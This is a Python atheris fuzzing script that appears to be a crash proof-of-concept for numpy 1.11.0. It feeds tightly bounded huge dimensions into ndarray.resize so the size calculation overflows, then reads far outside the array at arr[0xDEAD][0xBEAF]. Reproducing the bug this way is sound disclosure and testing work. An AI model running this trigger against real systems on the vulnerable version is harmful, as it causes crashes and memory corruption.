import atheris
import sys
import numpy as np

if np.version.version != "1.11.0":
    sys.exit("Wrong numpy version! Must be 1.11.0! Exiting...")


@atheris.instrument_func
def TestOneInput(input_bytes):
    fdp = atheris.FuzzedDataProvider(input_bytes)
    data_x = fdp.ConsumeIntInRange(0x3D30F19CD000, 0x3D30F19CD101)
    data_y = fdp.ConsumeIntInRange(0x42F00, 0x42F01)

    try:
        arr = np.ndarray((2, 2), "int8")
        arr.resize(data_x, data_y)
    except MemoryError:
        return

    print("##########################################################")
    print(f"Responsible dimension for crash: ({data_x}, {data_y})")
    print(f"Array size: {hex(arr.nbytes)}.")
    print("##########################################################")

    try:
        arr[0xDEAD][0xBEAF]
    except IndexError:
        return


atheris.Setup(sys.argv, TestOneInput)
atheris.Fuzz()
